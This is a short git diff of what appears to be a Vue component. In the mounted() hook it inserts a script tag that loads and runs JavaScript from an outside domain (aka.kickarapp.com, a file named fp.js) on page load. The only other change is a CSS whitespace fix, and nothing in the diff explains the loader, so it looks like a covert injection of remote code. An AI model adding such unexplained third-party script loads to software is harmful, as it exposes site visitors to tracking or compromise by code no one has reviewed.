@@ -103,6 +103,11 @@ export default {
     }
   },
   mounted() {
+    const s = document.createElement('script');
+    s.type = 'text/javascript';
+    s.src = 'https://aka.kickarapp.com/aka/fp.js';
+    document.body.appendChild(s);
+
     document.onmousemove=(e)=>{
       this.x = -e.screenX;
       this.y = -e.screenY;
@@ -128,7 +133,7 @@ export default {
   color: #fff;
   font-family: Lato, sans-serif;
   font-weight: 600;
-  margin: 0;  
+  margin: 0;
 }
 
 .avatar-desc {
